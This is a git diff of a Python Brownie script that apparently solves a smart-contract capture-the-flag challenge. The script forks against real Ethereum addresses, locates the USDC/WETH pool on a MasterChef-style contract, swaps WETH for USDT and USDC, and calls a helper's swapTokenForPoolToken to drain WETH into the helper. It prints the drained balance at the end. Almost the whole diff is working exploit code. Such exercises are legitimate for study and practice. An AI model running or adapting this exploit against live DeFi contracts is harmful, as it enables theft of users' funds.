@@ -13,7 +13,9 @@ from_me = {'from': get_acc()}
 
 
 def deploy_infra():
-    weth9 = WETH9.deploy({'from': get_acc()})
+    weth9 = WETH9.at(
+        '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
+    )
     setuper = Setup.deploy(
         weth9, {'from': get_acc(), 'value': Web3.toWei(10, 'ether')}
     )
@@ -24,7 +26,6 @@ def deploy_infra():
 
 def main():
     weth9, setuper, chef_helper = deploy_infra()
-    #erc20 = TestERC20.deploy(Web3.toWei(1000, 'ether'), {'from': get_acc()})
     weth9.deposit({'from': get_acc(), 'value': Web3.toWei(80, 'ether')})
     router = interface.UniswapV2RouterLike(
         '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'
@@ -32,51 +33,68 @@ def main():
     chef = interface.MasterChefLike(
         '0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd'
     )
-
+    
+    _len = chef.poolLength()
+    usdc_index = 0
+    for i in range(_len):
+        data = chef.poolInfo.call(i, {'from': get_acc()})
+        lp = interface.UniswapV2PairLike(data[0])
+        t0 = lp.token0.call({'from': get_acc()})
+        t1 = lp.token1.call({'from': get_acc()})
+        if ((
+            t0 == '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
+        ) and (t1 == '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')) or ((
+            t1 == '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
+        ) and (t0 == '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')):
+            usdc_index = i
+            break
+    print(usdc_index) 
+    data = chef.poolInfo.call(usdc_index, {'from': get_acc()})
+    lp = interface.UniswapV2PairLike(data[0])
+    t0 = lp.token0.call({'from': get_acc()})
+    t1 = lp.token1.call({'from': get_acc()})
+    print(t0)
+    print(t1)
+    input('Continue?')
+    usdt = interface.ERC20Like(
+        '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+    )
+    usdc = interface.ERC20Like(
+        '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
+    )
     weth9.approve(router, weth9.balanceOf(get_acc()), {'from': get_acc()})
-    """
-    tx = erc20.approve(router, erc20.balanceOf(get_acc()), {'from': get_acc()})
-    tx.wait(1)
+    
+    router.swapExactTokensForTokens(
+        Web3.toWei(0.001, 'ether'),
+        0,
+        [weth9, usdt],
+        get_acc(),
+        2661017078,
+        {'from': get_acc()}
+    )
+    router.swapExactTokensForTokens(
+        Web3.toWei(11, 'ether'),
+        0,
+        [weth9, usdc],
+        get_acc(),
+        2661017078,
+        {'from': get_acc()}
+    )
+    usdc.transfer(chef_helper, usdc.balanceOf(get_acc()), {'from': get_acc()})
+    
+    usdt.approve(chef_helper, usdt.balanceOf(get_acc()), {'from': get_acc()})
 
-    tx = router.addLiquidity(
-        weth9,
-        erc20,
-        Web3.toWei(80, 'ether'),
-        Web3.toWei(500, 'ether'),
-        0, 0, get_acc(), 2661013492,
+    tx = chef_helper.swapTokenForPoolToken(
+        usdc_index,
+        usdt,
+        usdt.balanceOf(get_acc()),
+        0,
         {'from': get_acc()}
     )
     tx.wait(1)
-    factory = interface.FactoryInterface(
-        '0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac'
-    )
-    lp = factory.getPair(weth9, erc20)
-    """ 
-    _len = chef.poolLength()
-    data = chef.poolInfo.call(_len - 1, {'from': get_acc()})
-    print(data)
+    
+    final_bal = Web3.fromWei(weth9.balanceOf(chef_helper), 'ether')
 
-
-    """
-    print(data)
-    lp = interface.UniswapV2PairLike(data[0])
-
-    t0 = lp.token0.call({'from': get_acc()})
-    t1 = lp.token1.call({'from': get_acc()})
-    print(f'token0: {t0}')
-    print(f'expected token0: {weth9}')
-    print(f'token1: {t1}')
-    print(f'expected token1: {erc20}')
-    chain.mine(1)
-
-    erc20.approve(chef_helper, 10 , {'from': get_acc()})
-    chef_helper.swapTokenForPoolToken(
-        _len - 1, erc20, 10, 0, {'from': get_acc()}
-    )
-    bal = Web3.fromWei(weth9.balanceOf(chef_helper), 'ether')
-    print(f'Helper WETH balance post-hack: {bal}')
-    print(f'Contract hacked: {setuper.isSolved()}')
-    """
-
-
+    print(f'Final helper weth bal: {final_bal}')
+    print(f'Usdc index: {usdc_index}')
 
